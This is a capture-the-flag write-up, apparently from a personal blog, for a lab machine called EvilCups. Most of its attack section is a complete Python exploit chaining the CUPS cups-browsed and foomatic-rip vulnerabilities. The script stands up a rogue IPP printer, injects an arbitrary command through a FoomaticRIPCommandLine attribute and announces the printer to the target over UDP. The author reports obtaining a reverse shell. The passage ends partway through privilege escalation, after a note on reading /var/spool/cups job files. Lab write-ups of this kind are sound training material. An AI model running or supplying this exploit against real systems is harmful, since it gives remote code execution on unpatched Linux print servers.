<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>EvilCups-Medium-LInux | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="EvilCups-Medium-LInux" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="EvilCups" />
<meta property="og:description" content="EvilCups" />
<link rel="canonical" href="https://your-site-url/writeups/2025/07/14/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/07/14/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-14T16:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="EvilCups-Medium-LInux" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-14T16:05:57+00:00","datePublished":"2025-07-14T16:05:57+00:00","description":"EvilCups","headline":"EvilCups-Medium-LInux","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/14/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7.html"},"url":"https://your-site-url/writeups/2025/07/14/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
<div class="post">
  <h1 class="post-title">EvilCups-Medium-LInux</h1>
  
  <div class="post-date">
    Published on 14 Jul 2025
    
  </div>
  
  <h1 id="evilcups">EvilCups</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start enumerating ports
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image.png" alt="image.png" />
<br /><br />
We can see CUPS running on 631 port, we can see the http api, we can see connected printers, jobs and its states
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_1.png" alt="image.png" />
<br /><br />
Normally we only scan tcp ports, but due to this is a printer service, we might need to check udp ports as well. effectively it is also communicating through udp
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_2.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Checking for vulnerabilities, there is a recent release, a serie of vulnerabilities where we can gain rce when we chain them
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_3.png" alt="image.png" />
<br /><br />
There is a PoC on internet, basically
<br /><br /></p>
<aside>
⚠️

`CVE-2024-47176` cups-browsed allows an attacker to install a remote malicious printer

`CVE-2024-47076` libcupsfilters allows an attacker provide malicious attributes in the printer to the cups

`CVE-2024-47175` libppd allows an attacker write in the PostScript Printer Description which is a file that determines how to print a document

`CVE-2024-47177` cups-filters allows inject malicious code to trigger it when the printer is used

</aside>
<p><br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="kn">from</span> <span class="nn">ippserver.server</span> <span class="kn">import</span> <span class="n">IPPServer</span>
<span class="kn">from</span> <span class="nn">ippserver.server</span> <span class="kn">import</span> <span class="n">IPPRequestHandler</span>
<span class="kn">import</span> <span class="nn">ippserver.behaviour</span> <span class="k">as</span> <span class="n">behaviour</span>
<span class="kn">from</span> <span class="nn">ippserver.constants</span> <span class="kn">import</span> <span class="p">(</span>
	<span class="n">OperationEnum</span><span class="p">,</span> <span class="n">StatusCodeEnum</span><span class="p">,</span> <span class="n">SectionEnum</span><span class="p">,</span> <span class="n">TagEnum</span>
<span class="p">)</span>
<span class="kn">from</span> <span class="nn">ippserver.parsers</span> <span class="kn">import</span> <span class="n">Integer</span><span class="p">,</span> <span class="n">Enum</span><span class="p">,</span> <span class="n">Boolean</span>
<span class="kn">from</span> <span class="nn">ippserver.request</span> <span class="kn">import</span> <span class="n">IppRequest</span>

<span class="k">class</span> <span class="nc">ServerContext</span><span class="p">:</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">server</span><span class="p">):</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">server</span>
		<span class="c1">#Necessary no initialaze because we are using a new thread
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">server_thread</span> <span class="o">=</span> <span class="bp">None</span>
	
	<span class="c1">#This is used when we call the class in a with statement
</span>	<span class="k">def</span> <span class="nf">__enter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'IPP server Listening on </span><span class="si">{</span><span class="n">server</span><span class="p">.</span><span class="n">server_address</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
		<span class="c1">#Keeping the server up until it would be stopped manually
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">server_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">)</span>
		<span class="c1">#Configure a daemon to the thread which relates the thread with the server
</span>		<span class="c1">#When the server stops the thread does the same
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">server_thread</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">server_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
	
	<span class="c1">#It executes when we go out from the with statement
</span>	<span class="c1">#exc_type and exc_value exception values to debug
</span>	<span class="c1">#traceback contains information about errors
</span>	<span class="k">def</span> <span class="nf">__exit__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">exc_type</span><span class="p">,</span> <span class="n">exc_value</span><span class="p">,</span> <span class="n">traceback</span><span class="p">):</span>
		<span class="k">print</span><span class="p">(</span><span class="s">'Shutting down the server....'</span><span class="p">)</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">shutdown</span><span class="p">()</span>
		<span class="c1">#Waiting until the server thread ends 
</span>		<span class="bp">self</span><span class="p">.</span><span class="n">server_thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>

<span class="c1">#It intercepts signals from the Operative System
</span><span class="k">def</span> <span class="nf">handle_signal</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="k">raise</span> <span class="nb">KeyboardInterrupt</span><span class="p">()</span>
		

<span class="c1">##Malicious is inherited from StatelessPrinter
</span><span class="k">class</span> <span class="nc">MaliciousPrinter</span><span class="p">(</span><span class="n">behaviour</span><span class="p">.</span><span class="n">StatelessPrinter</span><span class="p">):</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">):</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">command</span>
		<span class="c1">##It makes sure that we can call methods of statelessprinter
</span>		<span class="c1">##From Malicious printer
</span>		<span class="nb">super</span><span class="p">(</span><span class="n">MaliciousPrinter</span><span class="p">,</span> <span class="bp">self</span><span class="p">).</span><span class="n">__init__</span><span class="p">()</span>
	<span class="c1">#Attributes to write into .PPD file
</span>	<span class="k">def</span> <span class="nf">printer_list_attributes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-uri-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">uri</span><span class="p">):</span> <span class="p">[</span><span class="bp">self</span><span class="p">.</span><span class="n">printer_uri</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'uri-authentication-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">keyword</span><span class="p">):[</span><span class="sa">b</span><span class="s">'none'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'uri-security-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">keyword</span><span class="p">):[</span><span class="sa">b</span><span class="s">'none'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-name'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">name_without_language</span><span class="p">):[</span><span class="sa">b</span><span class="s">'Main Printer'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-info'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">text_without_language</span><span class="p">):[</span><span class="sa">b</span><span class="s">'Main Printer Info'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-make-and-model'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">text_without_language</span><span class="p">):[</span><span class="sa">b</span><span class="s">'HP 0.00'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-state'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">enum</span><span class="p">):[</span><span class="n">Enum</span><span class="p">(</span><span class="mi">3</span><span class="p">).</span><span class="nb">bytes</span><span class="p">()],</span> <span class="c1">#3 in idle
</span>			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-state-reasons'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">keyword</span><span class="p">):[</span><span class="sa">b</span><span class="s">'none'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'ipp-versions-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">keyword</span><span class="p">):[</span><span class="sa">b</span><span class="s">'1.1'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'operations-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">enum</span><span class="p">):[</span>
			<span class="n">Enum</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="nb">bytes</span><span class="p">()</span>
			<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">(</span>
				<span class="n">OperationEnum</span><span class="p">.</span><span class="n">print_job</span><span class="p">,</span>
				<span class="n">OperationEnum</span><span class="p">.</span><span class="n">validate_job</span><span class="p">,</span>
				<span class="n">OperationEnum</span><span class="p">.</span><span class="n">cancel_job</span><span class="p">,</span>
				<span class="n">OperationEnum</span><span class="p">.</span><span class="n">get_job_attributes</span><span class="p">,</span>
				<span class="n">OperationEnum</span><span class="p">.</span><span class="n">get_printer_attributes</span><span class="p">,</span>
			<span class="p">)],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'multiple-document-jobs-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">boolean</span><span class="p">):[</span><span class="n">Boolean</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="nb">bytes</span><span class="p">()],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'charset-configured'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">charset</span><span class="p">):[</span><span class="sa">b</span><span class="s">'utf-8'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'charset-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">charset</span><span class="p">):[</span><span class="sa">b</span><span class="s">'utf-8'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'natural-language-configured'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">natural_language</span><span class="p">):[</span><span class="sa">b</span><span class="s">'en'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'generated-natural-language-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">natural_language</span><span class="p">):[</span><span class="sa">b</span><span class="s">'en'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'document-format-default'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">mime_media_type</span><span class="p">):[</span><span class="sa">b</span><span class="s">'application/pdf'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'document-format-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">mime_media_type</span><span class="p">):[</span><span class="sa">b</span><span class="s">'application/pdf'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-is-accepting-jobs'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">boolean</span><span class="p">):[</span><span class="n">Boolean</span><span class="p">(</span><span class="bp">True</span><span class="p">).</span><span class="nb">bytes</span><span class="p">()],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'queued-job-count'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">integer</span><span class="p">):[</span><span class="n">Integer</span><span class="p">(</span><span class="mi">777</span><span class="p">).</span><span class="nb">bytes</span><span class="p">()],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'pdl-override-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">keyword</span><span class="p">):[</span><span class="sa">b</span><span class="s">'not-attempted'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-up-time'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">integer</span><span class="p">):[</span><span class="n">Integer</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">printer_uptime</span><span class="p">()).</span><span class="nb">bytes</span><span class="p">()],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'compression-supported'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">keyword</span><span class="p">):[</span><span class="sa">b</span><span class="s">'none'</span><span class="p">],</span>
			<span class="p">(</span><span class="n">SectionEnum</span><span class="p">.</span><span class="n">printer</span><span class="p">,</span> <span class="sa">b</span><span class="s">'printer-more-info'</span><span class="p">,</span> <span class="n">TagEnum</span><span class="p">.</span><span class="n">integer</span><span class="p">):[</span>
				<span class="c1">#Double quote at the begining to close the parameter with no info
</span>				<span class="c1">#Write your own parameters
</span>				<span class="sa">f</span><span class="s">'"</span><span class="se">\n</span><span class="s">*FoomaticRIPCommandLine: "</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">command</span><span class="si">}</span><span class="s">"</span><span class="se">\n</span><span class="s">*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
				<span class="c1">#No double quotes at the end
</span>				
			<span class="p">],</span>
		<span class="p">}</span>
		<span class="c1">#It adds basic attributes from the parent class
</span>		<span class="n">attr</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="nb">super</span><span class="p">().</span><span class="n">minimal_attributes</span><span class="p">())</span>
		<span class="k">return</span> <span class="n">attr</span>
		
		<span class="c1">#Function that sends the attributes of the malicious printer to CUPS
</span>		<span class="c1">#Req onject from IppRequest 
</span>		<span class="c1">#_psfile PostScript file
</span>	<span class="k">def</span> <span class="nf">operation_printer_list_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="n">_psfile</span><span class="p">):</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">target connected, sending payload ...."</span><span class="p">)</span>
		<span class="n">attributes</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">printer_list_attributes</span><span class="p">()</span>
		<span class="k">return</span> <span class="n">IppRequest</span><span class="p">(</span>
			<span class="bp">self</span><span class="p">.</span><span class="n">version</span><span class="p">,</span>
			<span class="n">StatusCodeEnum</span><span class="p">.</span><span class="n">ok</span><span class="p">,</span>
			<span class="c1">#Keeping coherence between requests and responses
</span>			<span class="n">req</span><span class="p">.</span><span class="n">request_id</span><span class="p">,</span>
			<span class="n">attributes</span><span class="p">)</span>
				
<span class="k">def</span> <span class="nf">send_browsed_packet</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">ipp_server</span><span class="p">,</span> <span class="n">ipp_server_port</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Sending upd packet to </span><span class="si">{</span><span class="n">target_ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">target_port</span><span class="si">}</span><span class="s">..."</span><span class="p">)</span>
	<span class="n">printer_type</span> <span class="o">=</span> <span class="mi">2</span>
	<span class="n">printer_state</span> <span class="o">=</span> <span class="s">'3'</span>
	<span class="n">printer_uri</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipp_server</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">ipp_server_port</span><span class="si">}</span><span class="s">/printers/EVILCUPS'</span>
	<span class="n">printer_location</span> <span class="o">=</span> <span class="s">'"Pwned"'</span>
	<span class="n">printer_info</span> <span class="o">=</span> <span class="s">'"POWN"'</span>
	<span class="n">printer_model</span> <span class="o">=</span> <span class="s">'"HP LaserJet 1020"'</span>
	<span class="c1">#Printer type hex format
</span>	<span class="n">packet</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">printer_type</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_state</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_uri</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_location</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_info</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">printer_model</span><span class="si">}</span><span class="s"> </span><span class="se">\n</span><span class="s">"</span>
	
	<span class="c1">#AF_INET means ipv4, SOCK_DGRAM means a socket udp based
</span>	<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
	<span class="n">sock</span><span class="p">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_port</span><span class="p">))</span>
	
	
<span class="c1">#It runs the server until the user use Crtl+c
</span><span class="k">def</span> <span class="nf">run_server</span><span class="p">(</span><span class="n">server</span><span class="p">):</span>
	<span class="k">with</span> <span class="n">ServerContext</span><span class="p">(</span><span class="n">server</span><span class="p">):</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
				<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(.</span><span class="mi">5</span><span class="p">)</span>
		<span class="c1">#It only go out from thw with statement allowing to execute __exit__
</span>		<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
			<span class="k">pass</span>
	<span class="c1">##__exit__ againt it called
</span>	<span class="n">server</span><span class="p">.</span><span class="n">shutdown</span><span class="p">()</span>
	

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"%s &lt;LOCAL_HOST&gt; &lt;TARGET_HOST&gt; &lt;COMMNAND&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
		<span class="n">quit</span><span class="p">()</span>
		
	<span class="n">SERVER_HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="mi">12345</span>
	
	<span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	
	<span class="c1">#It creates a new instance with the malicious printer
</span>	<span class="n">server</span> <span class="o">=</span> <span class="n">IPPServer</span><span class="p">((</span><span class="n">SERVER_HOST</span><span class="p">,</span> <span class="n">SERVER_PORT</span><span class="p">),</span>
										<span class="n">IPPRequestHandler</span><span class="p">,</span> <span class="n">MaliciousPrinter</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
								
	<span class="c1">#Using a thread to run a server as the malicious printer
</span>	<span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span>
		<span class="n">target</span> <span class="o">=</span> <span class="n">run_server</span><span class="p">,</span>
		<span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="p">)</span>
	<span class="p">).</span><span class="n">start</span><span class="p">()</span>
	
	<span class="n">TARGET_HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">631</span>
	
	<span class="n">send_browsed_packet</span><span class="p">(</span><span class="n">TARGET_HOST</span><span class="p">,</span> <span class="n">TARGET_PORT</span><span class="p">,</span> <span class="n">SERVER_HOST</span><span class="p">,</span> <span class="n">SERVER_PORT</span><span class="p">)</span>
	
	<span class="k">print</span><span class="p">(</span><span class="s">"Please wait, this normally takes 30 seconds...."</span><span class="p">)</span>
	
	<span class="n">seconds</span> <span class="o">=</span> <span class="mi">0</span>
	
	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="c1">#\r carrigae return, makes overwrite the text
</span>		<span class="c1">#end="" avoid jumping to another line
</span>		<span class="c1">#flush = makes the buffer empty immediately
</span>		<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\r</span><span class="si">{</span><span class="n">seconds</span><span class="si">}</span><span class="s"> elapsed"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span> <span class="bp">True</span><span class="p">)</span>
		<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">seconds</span> <span class="o">+=</span><span class="mi">1</span>
		
	
	
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_4.png" alt="image.png" />
<br /><br />
Effectively it is added
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_5.png" alt="image.png" />
<br /><br />
When we test our malicious printer we get the rev shell and the user flag
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_6.png" alt="image.png" />
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_7.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
There we can see out malicious printer
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_8.png" alt="image.png" />
<br /><br />
<img src="/assets/images/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7/63043f75-7e23-4c37-867d-9d6f6bdbe461-export-b08d9946-6d0a-4957-aefc-f529d6f60cc7_image_9.png" alt="image.png" />
<br /><br />
Check for the jobs running on it on <code class="language-plaintext highlighter-rouge">/var/spool/cups</code> actually we can’t list jobs, we have not got permissions but according with the format we will be able to cat them to get information, the format is in this way
<br /><br /></p>
<aside>
⚠️

For job description:  `c00001` 

For the content send to the printer:**`d00001-001`** 

d —&gt; Data file of the printer job

00001 —&gt; ID of the printer job

001 —&gt; Copy number or fragment

</aside>
<p><br /><br />
Cat the file
<br /><br />
